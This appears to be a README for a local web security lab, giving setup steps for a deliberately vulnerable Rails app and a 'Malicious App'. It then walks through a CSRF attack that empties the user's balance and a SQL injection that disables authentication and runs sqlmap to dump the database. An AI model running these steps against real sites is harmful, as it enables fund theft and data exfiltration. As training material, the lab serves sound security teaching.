### Setup 

1. Install MySQL Server
2. Configure mysql credentials on `vulnerable_app/config/database.yml`
3. Run `cd vulnerable_app && bundle exec rake db:create`
4. Run `cd vulnerable_app && bundle exec rake db:schema:load`
5. Start Malicious App by running `./servlet.rb`
6. Start Vulnerable App by running `rails s`
7. Sign up to Vulnerable App

### CSRF

1. Add money to your account (any mount greater than 0)
2. Go to Malicious App (http://localhost:4000)
3. Insert the following URL in the form: `http://127.0.0.1:3000/exploit?url=http%3A%2F%2Flocalhost%3A3000%2Fcharity` and submit it
4. Reload the Vulnerable app page and you should see $0 money

### SQL Injection

1. Comment `before_action :authenticate_user!` on `vulnerable_app/app/controllers/application_controller.erb`
2. Restart Vulnerable App by pressing `CTRL+C` and running `rails s` again
3. Install SQLMap (sqlmap.org)
4. Run `./sqlmap.py -u "http://localhost:3000/discover?email=something" -p email --dbms=mysql -a` and await for pwnage!

